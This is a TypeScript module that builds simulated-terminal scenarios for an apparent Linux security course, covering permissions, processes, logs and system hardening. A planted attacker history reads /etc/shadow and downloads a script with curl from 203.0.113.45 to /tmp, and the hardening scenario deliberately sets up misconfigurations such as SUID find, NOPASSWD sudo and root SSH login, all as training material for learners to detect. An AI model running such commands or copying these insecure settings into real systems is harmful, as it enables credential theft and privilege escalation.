/**
 * Simulated-terminal systems for Module 1. Each starts from the shared web01 base system
 * and adds the files and processes a lesson needs.
 */
import { bin, dir, file } from '../../terminal/fs';
import { baseScenario, withNodes } from '../../terminal/system';
import type { TerminalScenario, TerminalState } from '../../terminal/types';
import { peek } from '../../terminal/fs';
import { AUTH_LOG_TEXT } from './data/authLog';

/* ---------------------------- task-check helpers ---------------------------- */

export const node = (s: TerminalState, path: string) => peek(s.fs, path);
/** Permission bits of a file, or 0 if it does not exist. */
export const modeOf = (s: TerminalState, path: string) => (node(s, path)?.mode ?? 0) & 0o7777;
/** True if any command the learner ran matches the pattern. */
export const ran = (s: TerminalState, re: RegExp) => s.history.some((h) => re.test(h));
export const lastOut = (s: TerminalState) => s.lastStdout;

/* ---------------------------- scenarios ---------------------------- */

/** Fresh objects every call: scenarios must never share mutable nodes. */
const analystFiles = () => ({
  '/home/analyst/notes.txt': file('Things to check on web01:\n- review sudo rules\n- rotate the backup key\n', { owner: 'analyst', mode: 0o664, mtime: 'Oct 25 18:02' }),
  '/home/analyst/file.txt': file('quarterly numbers\nQ3: 41,200\n', { owner: 'analyst', mtime: 'Oct 25 18:05' }),
  '/home/analyst/scripts': dir({}, { owner: 'analyst', mtime: 'Oct 25 18:10' }),
});

export function architectureScenario(): TerminalScenario {
  return withNodes(baseScenario(), analystFiles());
}

export function filesystemScenario(): TerminalScenario {
  return withNodes(baseScenario(), {
    ...analystFiles(),
    '/home/analyst/projects': dir(
      {
        'audit-2026.md': file('# Audit findings\n\n1. /tmp is not mounted noexec\n', { owner: 'analyst', mtime: 'Oct 22 11:40' }),
        old: dir({ 'audit-2025.md': file('# Last year\n', { owner: 'analyst', mtime: 'Oct 21  2025' }) }, { owner: 'analyst' }),
      },
      { owner: 'analyst', mtime: 'Oct 22 11:40' },
    ),
    '/var/log/auth.log': file(AUTH_LOG_TEXT, { mode: 0o640, owner: 'syslog', group: 'adm', mtime: 'Oct 26 09:10' }),
  });
}

export function permissionsScenario(): TerminalScenario {
  return withNodes(baseScenario(), {
    ...analystFiles(),
    '/home/analyst/report.sh': file('#!/bin/bash\n# Prints a tiny system report\necho "Host: $HOSTNAME"\nuname -r\nwhoami\n', { owner: 'analyst', mode: 0o664, mtime: 'Oct 26 08:40' }),
    '/home/analyst/secret.txt': file('API key for the staging monitor: (redacted in this course)\n', { owner: 'analyst', mode: 0o644, mtime: 'Oct 26 08:41' }),
    '/home/analyst/handover.txt': file('Notes for alice about the deploy.\n', { owner: 'analyst', mode: 0o600, mtime: 'Oct 26 08:42' }),
    '/srv/team': dir({ 'plan.txt': file('Q4 plan\n', { owner: 'alice', group: 'developers', mode: 0o664 }) }, { mode: 0o2775, group: 'developers', mtime: 'Oct 24 10:00' }),
  });
}

export function processScenario(): TerminalScenario {
  const s = withNodes(baseScenario(), analystFiles());
  s.processes.push(
    { pid: 4242, ppid: 1, user: 'analyst', cmd: 'python3 /home/analyst/stress.py', comm: 'python3', state: 'R', tty: '?', cpu: 98.7, mem: 1.2, start: '09:07' },
    { pid: 4300, ppid: 2210, user: 'analyst', cmd: '/bin/bash ./backup.sh', comm: 'backup.sh', state: 'S', tty: 'pts/0', start: '09:11', termMessage: 'trap handler removed /tmp/backup.lock and exited cleanly' },
    { pid: 4310, ppid: 1, user: 'analyst', cmd: '/home/analyst/bin/stuck-worker --loop', comm: 'stuck-worker', state: 'S', tty: '?', start: '09:12', ignoresTerm: true },
  );
  return s;
}

const LAST_WITH_BOB = `analyst  pts/0        198.51.100.23    Mon Oct 26 09:02   still logged in
bob      pts/1        203.0.113.45     Mon Oct 26 03:15 - 03:21  (00:05)
reboot   system boot  6.8.0-45-generic Mon Oct 26 08:01   still running
alice    pts/1        198.51.100.40    Sun Oct 25 16:20 - 17:45  (01:25)
analyst  pts/0        198.51.100.23    Sun Oct 25 17:20 - 17:31  (00:11)

wtmp begins Thu Oct  1 07:55:02 2026
`;

export function logsScenario(): TerminalScenario {
  const base = baseScenario();
  base.lastOutput = LAST_WITH_BOB;
  return withNodes(base, {
    ...analystFiles(),
    '/var/log/auth.log': file(AUTH_LOG_TEXT, { mode: 0o640, owner: 'syslog', group: 'adm', mtime: 'Oct 26 09:10' }),
    '/home/bob/.bash_history': file('id\nsudo -l\nsudo cat /etc/shadow\nls -la /tmp\ncurl -s http://203.0.113.45/x.sh -o /tmp/.x.sh\nchmod +x /tmp/.x.sh\nexit\n', { owner: 'bob', mode: 0o600, mtime: 'Oct 26 03:21' }),
    '/tmp/.x.sh': file('#!/bin/sh\n# (downloaded script, contents removed for the course)\n', { owner: 'bob', group: 'bob', mode: 0o755, mtime: 'Oct 26 03:19' }),
  });
}

export function shellScenario(): TerminalScenario {
  return withNodes(baseScenario(), {
    ...analystFiles(),
    '/var/log/auth.log': file(AUTH_LOG_TEXT, { mode: 0o640, owner: 'syslog', group: 'adm', mtime: 'Oct 26 09:10' }),
    '/home/analyst/logins.txt': file(
      'FAIL 203.0.113.45\nOK 198.51.100.23\nFAIL 198.51.100.77\nFAIL 203.0.113.45\nOK 198.51.100.40\nFAIL 203.0.113.45\nFAIL 198.51.100.77\nFAIL 203.0.113.45\nOK 198.51.100.23\nFAIL 192.0.2.10\n',
      { owner: 'analyst', mtime: 'Oct 26 09:00' },
    ),
    '/home/analyst/scripts/hello.sh': file('#!/bin/bash\necho "Hello, $USER"\necho "You are in $PWD"\n', { owner: 'analyst', mode: 0o644, mtime: 'Oct 26 09:01' }),
    '/home/analyst/bin': dir({}, { owner: 'analyst', mtime: 'Oct 26 09:01' }),
  });
}

const HARDEN_SSHD = `# This is the sshd server system-wide configuration file.  See sshd_config(5).
Include /etc/ssh/sshd_config.d/*.conf

Port 22
PermitRootLogin yes
PubkeyAuthentication yes
PasswordAuthentication yes
KbdInteractiveAuthentication no
UsePAM yes
X11Forwarding yes
Subsystem	sftp	/usr/lib/openssh/sftp-server
`;

export function hardeningScenario(): TerminalScenario {
  const s = withNodes(baseScenario(), {
    ...analystFiles(),
    '/opt/backup': dir(
      { 'backup.sh': file('#!/bin/bash\n# nightly backup of /srv to the NAS\ntar czf /var/backups/srv.tgz /srv\n', { mode: 0o777, mtime: 'Sep 30 14:12' }) },
      { mtime: 'Sep 30 14:12' },
    ),
    '/etc/cron.d/backup': file('# m h dom mon dow user command\n*/5 * * * * root /opt/backup/backup.sh\n', { mtime: 'Sep 30 14:12' }),
    '/etc/profile.d/proxy.sh': file('export http_proxy=http://proxy.internal:3128\n', { mode: 0o666, mtime: 'Aug 14 09:30' }),
    '/usr/local/bin/backup-helper': bin(18440, { mode: 0o4755, mtime: 'Oct 25 03:18' }),
    '/etc/sudoers.d/deploy': file('deploy ALL=(ALL) NOPASSWD: ALL\n', { mode: 0o440, mtime: 'Jul  2 16:05' }),
    '/etc/ssh/sshd_config': file(HARDEN_SSHD, { mtime: 'Aug  9 11:20' }),
    '/srv/reports': dir({ 'q3-summary.csv': file('region,revenue\nnorth,41200\n', { mode: 0o666, owner: 'alice', group: 'alice', mtime: 'Oct 20 12:00' }) }),
  });
  // a misconfigured find binary with the SUID bit set
  const usrBin = s.fs.children!.usr.children!.bin;
  usrBin.children!.find = bin(204488, { mode: 0o4755, mtime: 'Apr  8  2024' });
  return s;
}
